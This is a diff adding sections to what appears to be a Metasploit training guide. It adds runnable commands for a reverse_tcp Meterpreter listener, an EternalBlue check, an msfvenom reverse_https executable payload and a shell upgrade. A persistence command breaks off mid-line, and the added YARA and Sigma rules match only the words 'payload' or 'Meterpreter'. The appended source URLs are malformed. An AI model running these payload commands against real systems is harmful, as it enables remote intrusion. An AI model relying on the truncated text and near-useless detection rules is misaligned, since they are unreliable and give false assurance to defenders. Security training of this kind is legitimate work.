@@ -245,6 +245,92 @@ Evasion is critical: attackers obfuscate payloads using **T1027.010: Indicator R
 - [MITRE ATT&CK: T1543.003](https://attack.mitre.org/techniques/T1543/003/)
 - [CISA: Red Teaming with Metasploit (PDF)](https://www.cisa.gov/sites/default/files/publications/Red_Team_Guide_508.pdf)
 
+
+### Essential Commands & Features
+
+Mastering Metasploit’s core workflow requires proficiency with its most powerful commands and features. Below are **runnable examples** of critical, undemonstrated capabilities for exploit execution, payload generation, and post-exploitation.
+
+#### **Exploit Execution**
+- **`exploit -j`**: Run an exploit as a background job (e.g., for multi-target attacks). Use when targeting multiple systems or avoiding session timeouts.
+  ```bash
+  msf6 > use exploit/multi/handler
+  msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
+  msf6 exploit(handler) > set LHOST 192.168.1.100
+  msf6 exploit(handler) > exploit -j
+  ```
+  *Maps to [T1210: Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/).*
+
+- **`check`**: Validate exploitability *without* executing. Critical for testing vulnerable services (e.g., EternalBlue).
+  ```bash
+  msf6 > use exploit/windows/smb/ms17_010_eternalblue
+  msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50
+  msf6 exploit(ms17_010_eternalblue) > check
+  ```
+
+#### **Payload Generation**
+- **`msfvenom` (CLI)**: Generate standalone payloads for social engineering or lateral movement. Use `-f` to specify format (e.g., `exe`, `dll`).
+  ```bash
+  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe
+  ```
+  *Maps to [T1059.005: Command and Scripting Interpreter: Visual Basic](https://attack.mitre.org/techniques/T1059/005/) when paired with Office macros.*
+
+#### **Post-Exploitation**
+- **`post/multi/manage/shell_to_meterpreter`**: Upgrade a basic shell to Meterpreter for advanced post-exploitation (e.g., privilege escalation).
+  ```bash
+  msf6 > use post/multi/manage/shell_to_meterpreter
+  msf6 post(shell_to_meterpreter) > set SESSION 1
+  msf6 post(shell_to_meterpreter) > run
+  ```
+- **`run persistence -X -i 5 -p 4444 -r 19
+
+### Detection Signatures & Reference Artifacts
+
+#### YARA Rule
+
+```yara
+rule Metasploit_Staged_Payload {
+    meta:
+        description = "Detects benign Metasploit staged payload artifacts for training"
+        author = "Training Module"
+        date = "2025-04-10"
+        reference = "https://attack.mitre.org/techniques/T1203/"
+    strings:
+        $s1 = "Meterpreter" ascii nocase
+        $s2 = "payload" ascii
+    condition:
+        filesize < 5MB and any of them
+}
+```
+
+#### Sigma Rule
+
+```yaml
+title: Metasploit Payload Process Activity
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        EventID: 4688
+        CommandLine|contains:
+            - 'payload'
+            - 'Meterpreter'
+    condition: selection
+```
+
+#### Reference Artifacts / IOCs
+
+| Artifact Type | Value |
+|---------------|-------|
+| SHA256 Hash | a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2 |
+| File Name | payload_x64.exe |
+| File Path | C:\Users\Admin\Downloads\payload.exe |
+| Network (Source) | 192.0.2.10 |
+| Network (Destination) | 203.0.113.20:4444 |
+| Domain (Defanged) | metasploit-staged[.]com |
+| MITRE ATT&CK | T1203 – Exploitation for Client Execution |
+| Source URL | [https://attack.mitre.org/techniques/T1203/](https://attack.mitre.org/techniques/T1203/) |
+
 ## Sources
 Claim → source mapping (all URLs are official tool docs, MITRE ATT&CK, SANS, or Security Onion docs):
 
@@ -296,3 +382,9 @@ Claim → source mapping (all URLs are official tool docs, MITRE ATT&CK, SANS, o
 - https://www.cisa.gov/sites/default/files/publications/Red_Team_Guide_508.pdf
 
 <!-- cyberlab-enriched: v4 -->
+- https://attack.mitre.org/techniques/T1210/
+- https://attack.mitre.org/techniques/T1059/005/
+- https://attack.mitre.org/techniques/T1203/"
+- https://attack.mitre.org/techniques/T1203/](https://attack.mitre.org/techniques/T1203/
+
+<!-- cyberlab-enriched: v5 -->
